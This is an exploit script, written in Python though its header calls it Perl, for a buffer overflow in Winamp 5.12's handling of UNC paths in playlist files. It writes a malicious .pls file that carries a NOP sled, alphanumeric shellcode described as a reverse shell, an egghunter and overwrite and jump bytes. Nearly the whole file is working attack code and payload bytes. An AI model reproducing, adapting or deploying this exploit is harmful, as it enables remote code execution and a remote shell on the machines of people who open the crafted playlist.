#!/usr/bin/python -v
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ==================================================================== 
start= "[playlist]\r\nFile1=\\\\";

#alpha numeric shellcode for reverse shell
nop =  "\x90"*50+"T00WT00W"
nop += "\x89\xe0\xda\xd9\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49"
nop += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
nop += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
nop += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
nop += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x7a\x48\x4b"
nop += "\x32\x45\x50\x65\x50\x75\x50\x63\x50\x4e\x69\x68\x65"
nop += "\x35\x61\x4b\x70\x71\x74\x6e\x6b\x32\x70\x36\x50\x4c"
nop += "\x4b\x66\x32\x56\x6c\x6c\x4b\x33\x62\x57\x64\x4c\x4b"
nop += "\x62\x52\x77\x58\x76\x6f\x48\x37\x51\x5a\x31\x36\x36"
nop += "\x51\x59\x6f\x4c\x6c\x75\x6c\x71\x71\x31\x6c\x35\x52"
nop += "\x76\x4c\x55\x70\x6b\x71\x68\x4f\x44\x4d\x76\x61\x4f"
nop += "\x37\x58\x62\x79\x62\x76\x32\x73\x67\x6e\x6b\x62\x72"
nop += "\x46\x70\x6e\x6b\x42\x6a\x47\x4c\x6e\x6b\x50\x4c\x36"
nop += "\x71\x52\x58\x6d\x33\x52\x68\x37\x71\x7a\x71\x43\x61"
nop += "\x4c\x4b\x33\x69\x31\x30\x35\x51\x6a\x73\x6c\x4b\x51"
nop += "\x59\x72\x38\x6a\x43\x67\x4a\x70\x49\x6c\x4b\x44\x74"
nop += "\x4c\x4b\x35\x51\x39\x46\x36\x51\x69\x6f\x6c\x6c\x79"
nop += "\x51\x4a\x6f\x76\x6d\x57\x71\x49\x57\x76\x58\x4b\x50"
nop += "\x62\x55\x39\x66\x77\x73\x43\x4d\x69\x68\x47\x4b\x71"
nop += "\x6d\x35\x74\x72\x55\x7a\x44\x43\x68\x6e\x6b\x31\x48"
nop += "\x44\x64\x73\x31\x58\x53\x63\x56\x4c\x4b\x74\x4c\x42"
nop += "\x6b\x4c\x4b\x31\x48\x37\x6c\x45\x51\x39\x43\x6c\x4b"
nop += "\x65\x54\x6e\x6b\x33\x31\x78\x50\x4c\x49\x51\x54\x51"
nop += "\x34\x56\x44\x43\x6b\x33\x6b\x50\x61\x56\x39\x31\x4a"
nop += "\x62\x71\x69\x6f\x69\x70\x33\x6f\x53\x6f\x32\x7a\x4c"
nop += "\x4b\x46\x72\x7a\x4b\x6e\x6d\x71\x4d\x61\x78\x56\x53"
nop += "\x34\x72\x73\x30\x45\x50\x53\x58\x44\x37\x53\x43\x46"
nop += "\x52\x51\x4f\x66\x34\x55\x38\x72\x6c\x42\x57\x55\x76"
nop += "\x47\x77\x59\x6f\x4e\x35\x6e\x58\x4e\x70\x45\x51\x53"
nop += "\x30\x33\x30\x44\x69\x6b\x74\x71\x44\x32\x70\x45\x38"
nop += "\x55\x79\x6d\x50\x50\x6b\x35\x50\x4b\x4f\x39\x45\x66"
nop += "\x30\x36\x30\x50\x50\x46\x30\x37\x30\x72\x70\x33\x70"
nop += "\x70\x50\x73\x58\x38\x6a\x76\x6f\x39\x4f\x49\x70\x39"
nop += "\x6f\x7a\x75\x4a\x37\x73\x5a\x37\x75\x65\x38\x39\x50"
nop += "\x4f\x58\x65\x50\x55\x38\x43\x58\x73\x32\x57\x70\x46"
nop += "\x61\x6f\x4b\x4f\x79\x79\x76\x43\x5a\x56\x70\x43\x66"
nop += "\x56\x37\x73\x58\x6c\x59\x79\x35\x73\x44\x45\x31\x4b"
nop += "\x4f\x6b\x65\x6c\x45\x6f\x30\x32\x54\x56\x6c\x6b\x4f"
nop += "\x32\x6e\x66\x68\x34\x35\x58\x6c\x51\x78\x6c\x30\x68"
nop += "\x35\x69\x32\x36\x36\x69\x6f\x78\x55\x52\x48\x55\x33"
nop += "\x30\x6d\x50\x64\x75\x50\x4e\x69\x69\x73\x76\x37\x73"
nop += "\x67\x33\x67\x44\x71\x79\x66\x50\x6a\x36\x72\x62\x79"
nop += "\x36\x36\x68\x62\x69\x6d\x63\x56\x6b\x77\x31\x54\x47"
nop += "\x54\x37\x4c\x33\x31\x73\x31\x4e\x6d\x50\x44\x64\x64"
nop += "\x34\x50\x78\x46\x43\x30\x51\x54\x43\x64\x72\x70\x36"
nop += "\x36\x71\x46\x42\x76\x57\x36\x71\x46\x50\x4e\x32\x76"
nop += "\x73\x66\x30\x53\x32\x76\x72\x48\x30\x79\x5a\x6c\x45"
nop += "\x6f\x4c\x46\x79\x6f\x6a\x75\x4f\x79\x59\x70\x32\x6e"
nop += "\x56\x36\x31\x56\x4b\x4f\x66\x50\x33\x58\x63\x38\x4e"
nop += "\x67\x37\x6d\x45\x30\x6b\x4f\x39\x45\x4f\x4b\x38\x70"
nop += "\x4c\x75\x6f\x52\x36\x36\x52\x48\x79\x36\x6a\x35\x6d"
nop += "\x6d\x4f\x6d\x39\x6f\x59\x45\x65\x6c\x35\x56\x33\x4c"
nop += "\x66\x6a\x6d\x50\x6b\x4b\x49\x70\x74\x35\x66\x65\x4d"
nop += "\x6b\x67\x37\x32\x33\x73\x42\x72\x4f\x72\x4a\x77\x70"
nop += "\x42\x73\x49\x6f\x4a\x75\x41\x41"
nop += "\x90"*(856-len(nop))

#nop =856
#alpha numeric egghunter 

shellcode  ="\x90" * 6  
shellcode +="\x89\xe6\xdd\xc7\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
shellcode +="\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
shellcode +="\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
shellcode +="\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode +="\x45\x36\x4b\x31\x49\x5a\x4b\x4f\x44\x4f\x47\x32\x46\x32\x43"
shellcode +="\x5a\x43\x32\x51\x48\x48\x4d\x46\x4e\x47\x4c\x43\x35\x50\x5a" 
shellcode +="\x42\x54\x4a\x4f\x48\x38\x50\x54\x46\x50\x50\x30\x46\x37\x4c"
shellcode +="\x4b\x4a\x5a\x4e\x4f\x43\x45\x4a\x4a\x4e\x4f\x44\x35\x4d\x37" 
shellcode +="\x4b\x4f\x4b\x57\x4a\x30\x41\x41" 
shellcode +="\x90" * 32

#shellcode =166


jmp="\xd2\xc3\x18\x1a"+"\xE9\x4b\xFF\xFF\xFF\x83\x83\x83"+"\x90\x90\x90\x90" 

end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n" 

buffer=start+nop+shellcode+jmp+end

mefile = open('test.pls','w');
mefile.write(buffer);
mefile.close()